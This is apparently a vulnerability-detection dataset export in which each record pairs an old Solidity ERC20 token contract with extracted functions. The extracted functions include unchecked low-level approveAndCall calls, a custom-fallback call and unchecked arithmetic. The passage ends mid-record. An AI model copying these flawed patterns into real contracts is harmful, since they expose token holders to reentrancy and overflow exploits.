[{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1428"
  },
  "filename": "10.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token{\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns\n (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns\n (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256\n _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns\n (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success)\n {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(uint256 _initialAmount, string _tokenName, uint8 _decimalUnits, string _tokenSymbol) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1429"
  },
  "filename": "1009.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract VerixChain is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n uint256 public unitsOneEthCanBuy;\n uint256 public totalEthInWei;\n address public fundsWallet;\n function VerixChain() {\n balances[msg.sender] = 33333333333000000000000000000;\n totalSupply = 33333333333000000000000000000;\n name = \"VerixChain\";\n decimals = 18;\n symbol = \"Verix\";\n unitsOneEthCanBuy = 333333333;\n fundsWallet = msg.sender;\n }\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n Transfer(fundsWallet, msg.sender, amount);\n fundsWallet.transfer(msg.value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb142a"
  },
  "filename": "1055.sol",
  "content": "pragma solidity ^0.4.16;\ncontract LUXREUMToken {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\nlibrary ABCMaths {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b > 0);\n uint256 c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n address public newOwner;\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n modifier validAddress(address _address) {\n require(_address != 0x0);\n _;\n }\n function transferOwnership(address _newOwner) onlyOwner {\n if (_newOwner != address(0)) {\n owner = _newOwner;\n }\n }\n function acceptOwnership() {\n require(msg.sender == newOwner);\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n event OwnershipTransferred(address indexed _from, address indexed _to);\n}\ncontract LXRStandardToken is LUXREUMToken, Ownable {\n using ABCMaths for uint256;\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n mapping (address => bool) public frozenAccount;\n event FrozenFunds(address target, bool frozen);\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function freezeAccount(address target, bool freeze) onlyOwner {\n frozenAccount[target] = freeze;\n FrozenFunds(target, freeze);\n }\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (frozenAccount[msg.sender]) return false;\n require(\n (balances[msg.sender] >= _value)\n && (_value > 0)\n && (_to != address(0))\n && (balances[_to].add(_value) >= balances[_to])\n && (msg.data.length >= (2 * 32) + 4));\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (frozenAccount[msg.sender]) return false;\n require(\n (allowed[_from][msg.sender] >= _value)\n && (balances[_from] >= _value)\n && (_value > 0)\n && (_to != address(0))\n && (balances[_to].add(_value) >= balances[_to])\n && (msg.data.length >= (2 * 32) + 4)\n );\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n require((_value == 0) || (allowed[msg.sender][_spender] == 0));\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract LUXREUM is LXRStandardToken {\n uint256 constant public decimals = 18;\n uint256 public totalSupply = 200 * (10**7) * 10**18 ;\n string constant public name = \"LUXREUM\";\n string constant public symbol = \"LXR\";\n function LUXREUM(){\n balances[msg.sender] = totalSupply;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb142b"
  },
  "filename": "1086.sol",
  "content": "pragma solidity ^0.4.16;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract QRRial is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function QRRial(\n ) {\n balances[msg.sender] = 21000000000000000000000000;\n totalSupply = 21000000000000000000000000;\n name = \"QR Rial\";\n decimals = 18;\n symbol = \"QRR\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb142c"
  },
  "filename": "1216.sol",
  "content": "pragma solidity ^0.4.21;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC223 {\n function balanceOf(address who) public view returns (uint);\n function name() public view returns (string _name);\n function symbol() public view returns (string _symbol);\n function decimals() public view returns (uint8 _decimals);\n function totalSupply() public view returns (uint256 _supply);\n function transfer(address to, uint value) public returns (bool ok);\n function transfer(address to, uint value, bytes data) public returns (bool ok);\n function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event Burn(address indexed burner, uint256 value);\n}\ncontract ContractReceiver {\n struct TKN {\n address sender;\n uint value;\n bytes data;\n bytes4 sig;\n }\n function tokenFallback(address _from, uint _value, bytes _data) public pure {\n TKN memory tkn;\n tkn.sender = _from;\n tkn.value = _value;\n tkn.data = _data;\n uint32 u = uint32(_data[3]) + (uint32(_data[2]) << 8) + (uint32(_data[1]) << 16) + (uint32(_data[0]) << 24);\n tkn.sig = bytes4(u);\n }\n}\ncontract ForeignToken {\n function balanceOf(address _owner) constant public returns (uint256);\n function transfer(address _to, uint256 _value) public returns (bool);\n}\ncontract ArtifactCoin is ERC223 {\n using SafeMath for uint256;\n using SafeMath for uint;\n address public owner = msg.sender;\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n mapping (address => bool) public blacklist;\n mapping (address => uint256) public unlockUnixTime;\n string internal name_= \"ArtifactCoin\";\n string public Information= \"アーティファクトチェーン\";\n string internal symbol_ = \"3A\";\n uint8 internal decimals_= 18;\n bool public canTransfer = true;\n uint256 public etherGetBase=6000000;\n uint256 internal totalSupply_= 2000000000e18;\n uint256 public OfficalHolding = totalSupply_.mul(30).div(100);\n uint256 public totalRemaining = totalSupply_;\n uint256 public totalDistributed = 0;\n uint256 internal freeGiveBase = 300e17;\n uint256 public lowEth = 1e14;\n bool public distributionFinished = false;\n bool public endFreeGet = false;\n bool public endEthGet = false;\n modifier canDistr() {\n require(!distributionFinished);\n _;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n modifier canTrans() {\n require(canTransfer == true);\n _;\n }\n modifier onlyWhitelist() {\n require(blacklist[msg.sender] == false);\n _;\n }\n function ArtifactCoin (address offical) public {\n owner = msg.sender;\n distr(offical, OfficalHolding);\n }\n function name() public view returns (string _name) {\n return name_;\n }\n function symbol() public view returns (string _symbol) {\n return symbol_;\n }\n function decimals() public view returns (uint8 _decimals) {\n return decimals_;\n }\n function totalSupply() public view returns (uint256 _totalSupply) {\n return totalSupply_;\n }\n function transfer(address _to, uint _value, bytes _data, string _custom_fallback) canTrans public returns (bool success) {\n if(isContract(_to)) {\n if (balanceOf(msg.sender) < _value) revert();\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));\n Transfer(msg.sender, _to, _value, _data);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n else {\n return transferToAddress(_to, _value, _data);\n }\n }\n function transfer(address _to, uint _value, bytes _data) canTrans public returns (bool success) {\n if(isContract(_to)) {\n return transferToContract(_to, _value, _data);\n }\n else {\n return transferToAddress(_to, _value, _data);\n }\n }\n function transfer(address _to, uint _value) canTrans public returns (bool success) {\n bytes memory empty;\n if(isContract(_to)) {\n return transferToContract(_to, _value, empty);\n }\n else {\n return transferToAddress(_to, _value, empty);\n }\n }\n function isContract(address _addr) private view returns (bool is_contract) {\n uint length;\n assembly {\n length := extcodesize(_addr)\n }\n return (length>0);\n }\n function transferToAddress(address _to, uint _value, bytes _data) private returns (bool success) {\n if (balanceOf(msg.sender) < _value) revert();\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value, _data);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferToContract(address _to, uint _value, bytes _data) private returns (bool success) {\n if (balanceOf(msg.sender) < _value) revert();\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n ContractReceiver receiver = ContractReceiver(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n Transfer(msg.sender, _to, _value, _data);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint balance) {\n return balances[_owner];\n }\n function changeOwner(address newOwner) onlyOwner public {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n function enableWhitelist(address[] addresses) onlyOwner public {\n require(addresses.length <= 255);\n for (uint8 i = 0; i < addresses.length; i++) {\n blacklist[addresses[i]] = false;\n }\n }\n function disableWhitelist(address[] addresses) onlyOwner public {\n require(addresses.length <= 255);\n for (uint8 i = 0; i < addresses.length; i++) {\n blacklist[addresses[i]] = true;\n }\n }\n function finishDistribution() onlyOwner canDistr public returns (bool) {\n distributionFinished = true;\n return true;\n }\n function startDistribution() onlyOwner public returns (bool) {\n distributionFinished = false;\n return true;\n }\n function finishFreeGet() onlyOwner canDistr public returns (bool) {\n endFreeGet = true;\n return true;\n }\n function finishEthGet() onlyOwner canDistr public returns (bool) {\n endEthGet = true;\n return true;\n }\n function startFreeGet() onlyOwner canDistr public returns (bool) {\n endFreeGet = false;\n return true;\n }\n function startEthGet() onlyOwner canDistr public returns (bool) {\n endEthGet = false;\n return true;\n }\n function startTransfer() onlyOwner public returns (bool) {\n canTransfer = true;\n return true;\n }\n function stopTransfer() onlyOwner public returns (bool) {\n canTransfer = false;\n return true;\n }\n function changeBaseValue(uint256 _freeGiveBase,uint256 _etherGetBase,uint256 _lowEth) onlyOwner public returns (bool) {\n freeGiveBase = _freeGiveBase;\n etherGetBase=_etherGetBase;\n lowEth=_lowEth;\n return true;\n }\n function distr(address _to, uint256 _amount) canDistr private returns (bool) {\n require(totalRemaining >= 0);\n require(_amount<=totalRemaining);\n totalDistributed = totalDistributed.add(_amount);\n totalRemaining = totalRemaining.sub(_amount);\n balances[_to] = balances[_to].add(_amount);\n Transfer(address(0), _to, _amount);\n return true;\n }\n function distribution(address[] addresses, uint256 amount) onlyOwner canDistr public {\n require(addresses.length <= 255);\n require(amount <= totalRemaining);\n for (uint8 i = 0; i < addresses.length; i++) {\n require(amount <= totalRemaining);\n distr(addresses[i], amount);\n }\n if (totalDistributed >= totalSupply_) {\n distributionFinished = true;\n }\n }\n function distributeAmounts(address[] addresses, uint256[] amounts) onlyOwner canDistr public {\n require(addresses.length <= 255);\n require(addresses.length == amounts.length);\n for (uint8 i = 0; i < addresses.length; i++) {\n require(amounts[i] <= totalRemaining);\n distr(addresses[i], amounts[i]);\n if (totalDistributed >= totalSupply_) {\n distributionFinished = true;\n }\n }\n }\n function () external payable {\n get();\n }\n function get() payable canDistr onlyWhitelist public {\n if (freeGiveBase > totalRemaining) {\n freeGiveBase = totalRemaining;\n }\n address investor = msg.sender;\n uint256 etherValue=msg.value;\n uint256 value;\n uint256 gasPrice=tx.gasprice;\n if(etherValue>lowEth){\n require(endEthGet==false);\n value=etherValue.mul(etherGetBase);\n value=value.add(freeGiveBase.mul(gasPrice.div(1e8)));\n require(value <= totalRemaining);\n distr(investor, value);\n if(!owner.send(etherValue))revert();\n }else{\n require(endFreeGet==false\n && freeGiveBase <= totalRemaining\n && now>=unlockUnixTime[investor]);\n value=freeGiveBase.mul(gasPrice.div(1e8));\n distr(investor, value);\n unlockUnixTime[investor]=now+1 days;\n }\n if (totalDistributed >= totalSupply_) {\n distributionFinished = true;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) canTrans public returns (bool success) {\n require(_to != address(0)\n && _value > 0\n && balances[_from] >= _value\n && allowed[_from][msg.sender] >= _value\n && blacklist[_from] == false\n && blacklist[_to] == false);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function getTokenBalance(address tokenAddress, address who) constant public returns (uint256){\n ForeignToken t = ForeignToken(tokenAddress);\n uint256 bal = t.balanceOf(who);\n return bal;\n }\n function withdraw(address receiveAddress) onlyOwner public {\n uint256 etherBalance = address(this).balance;\n if(!receiveAddress.send(etherBalance))revert();\n }\n function burn(uint256 _value) onlyOwner public {\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n totalDistributed = totalDistributed.sub(_value);\n Burn(burner, _value);\n }\n function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {\n ForeignToken token = ForeignToken(_tokenContract);\n uint256 amount = token.balanceOf(address(this));\n return token.transfer(owner, amount);\n }\n}",
  "extract_feature": [
    "function get() payable canDistr onlyWhitelist public {\nif (freeGiveBase > totalRemaining) {\nfreeGiveBase = totalRemaining;\n}\naddress investor = msg.sender;\nuint256 etherValue=msg.value;\nuint256 value;\nuint256 gasPrice=tx.gasprice;\nif(etherValue>lowEth){\nrequire(endEthGet==false);\nvalue=etherValue.mul(etherGetBase);\nvalue=value.add(freeGiveBase.mul(gasPrice.div(1e8)));\nrequire(value <= totalRemaining);\ndistr(investor, value);\nif(!owner.send(etherValue))revert();\n}else{\nrequire(endFreeGet==false\n&& freeGiveBase <= totalRemaining\n&& now>=unlockUnixTime[investor]);\nvalue=freeGiveBase.mul(gasPrice.div(1e8));\ndistr(investor, value);\nunlockUnixTime[investor]=now+1 days;\n}\nif (totalDistributed >= totalSupply_) {\ndistributionFinished = true;\n}\n}",
    "function withdraw(address receiveAddress) onlyOwner public {\nuint256 etherBalance = address(this).balance;\nif(!receiveAddress.send(etherBalance))revert();\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb142d"
  },
  "filename": "1229.sol",
  "content": "pragma solidity ^0.4.18;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract AT is ERC20 {\n using SafeMath for uint256;\n address owner = msg.sender;\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n string public constant name = \"AT\";\n string public constant symbol = \"AT\";\n uint public constant decimals = 8;\n uint256 public totalSupply = 17900000000e8;\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event Burn(address indexed burner, uint256 value);\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function AT () public {\n owner = msg.sender;\n balances[msg.sender] = totalSupply;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n function balanceOf(address _owner) constant public returns (uint256) {\n return balances[_owner];\n }\n modifier onlyPayloadSize(uint size) {\n assert(msg.data.length >= size + 4);\n _;\n }\n function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {\n require(_to != address(0));\n require(_amount <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n balances[_to] = balances[_to].add(_amount);\n Transfer(msg.sender, _to, _amount);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {\n require(_to != address(0));\n require(_amount <= balances[_from]);\n require(_amount <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_amount);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);\n balances[_to] = balances[_to].add(_amount);\n Transfer(_from, _to, _amount);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant public returns (uint256) {\n return allowed[_owner][_spender];\n }\n function withdraw() onlyOwner public {\n uint256 etherBalance = this.balance;\n owner.transfer(etherBalance);\n }\n function burn(uint256 _value) onlyOwner public {\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb142e"
  },
  "filename": "1336.sol",
  "content": "pragma solidity ^0.4.20;\ninterface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }\nlibrary SafeMath {\n function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n if (_a == 0) {\n return 0;\n }\n c = _a * _b;\n assert(c / _a == _b);\n return c;\n }\n function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n return _a / _b;\n }\n function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n assert(_b <= _a);\n return _a - _b;\n }\n function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n c = _a + _b;\n assert(c >= _a);\n return c;\n }\n}\ncontract TokenERC20 {\n address public owner;\n string public name;\n string public symbol;\n uint8 public decimals = 8;\n using SafeMath for uint256;\n uint256 public totalSupply;\n mapping (address => uint256) public balanceOf;\n mapping (address => mapping (address => uint256)) public allowance;\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Burn(address indexed from, uint256 value);\n mapping (address => bool) public frozenAccount;\n event FrozenFunds(address target, bool frozen);\n function TokenERC20(\n uint256 initialSupply,\n string tokenName,\n string tokenSymbol\n ) public {\n owner = msg.sender;\n totalSupply = initialSupply * 10 ** uint256(decimals);\n balanceOf[msg.sender] = totalSupply;\n name = tokenName;\n symbol = tokenSymbol;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n function _transfer(address _from, address _to, uint _value) internal {\n require(_to != 0x0);\n require(balanceOf[_from] >= _value);\n require(balanceOf[_to].add(_value) > balanceOf[_to]);\n uint previousBalances = balanceOf[_from].add(balanceOf[_to]);\n balanceOf[_from] = balanceOf[_from].sub(_value);\n balanceOf[_to] = balanceOf[_to].add(_value);\n Transfer(_from, _to, _value);\n assert(balanceOf[_from].add(balanceOf[_to]) == previousBalances);\n }\n function transfer(address _to, uint256 _value) public {\n require(!frozenAccount[msg.sender]);\n _transfer(msg.sender, _to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n require(!frozenAccount[msg.sender]);\n require(_value <= allowance[_from][msg.sender]);\n allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);\n _transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public\n returns (bool success) {\n allowance[msg.sender][_spender] = _value;\n return true;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData)\n public\n returns (bool success) {\n tokenRecipient spender = tokenRecipient(_spender);\n if (approve(_spender, _value)) {\n spender.receiveApproval(msg.sender, _value, this, _extraData);\n return true;\n }\n }\n function burn(uint256 _value) onlyOwner public returns (bool success) {\n require(balanceOf[msg.sender] >= _value);\n balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);\n totalSupply =totalSupply.sub(_value);\n Burn(msg.sender, _value);\n return true;\n }\n function burnFrom(address _from, uint256 _value) onlyOwner public returns (bool success) {\n require(balanceOf[_from] >= 